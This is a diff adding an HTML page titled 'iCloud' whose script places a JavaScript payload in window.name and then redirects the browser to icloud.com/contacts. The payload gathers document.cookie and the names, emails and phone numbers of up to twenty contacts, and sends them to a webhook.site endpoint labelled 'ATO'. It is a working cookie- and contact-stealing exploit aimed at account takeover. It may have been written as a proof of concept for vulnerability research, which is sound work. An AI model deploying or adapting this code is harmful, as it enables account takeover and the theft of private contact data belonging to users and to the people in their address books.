@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><title>iCloud</title></head>
+<body>
+<script>
+window.name = (function(){
+  var payload = '(function(){' +
+    'var d={ts:Date.now(),c:document.cookie,n:0,contacts:[]};' +
+    'try{' +
+      'var ctrl=Contacts.contactsController;' +
+      'var list=ctrl.get("sortedContacts")||ctrl.get("allContacts")||ctrl.get("content")||[];' +
+      'if(list&&list.toArray)list=list.toArray();' +
+      'if(Array.isArray(list)){' +
+        'd.n=list.length;' +
+        'd.contacts=list.slice(0,20).map(function(c){' +
+          'return{' +
+            'fn:c.get("firstName")||"",' +
+            'ln:c.get("lastName")||"",' +
+            'em:(c.get("emails")||[]).map(function(e){return e.value||""}).join(","),' +
+            'ph:(c.get("phones")||[]).map(function(p){return p.value||""}).join(",")' +
+          '};' +
+        '});' +
+      '}' +
+    '}catch(e){}' +
+    'window.top.location.href="https://webhook.site/oob?t=ATO&ts="+d.ts+"&d="+encodeURIComponent(JSON.stringify(d)).slice(0,3000);' +
+  '})();';
+  return payload;
+})();
+location.href = 'https://www.icloud.com/contacts/';
+</script>
+</body>
+</html>
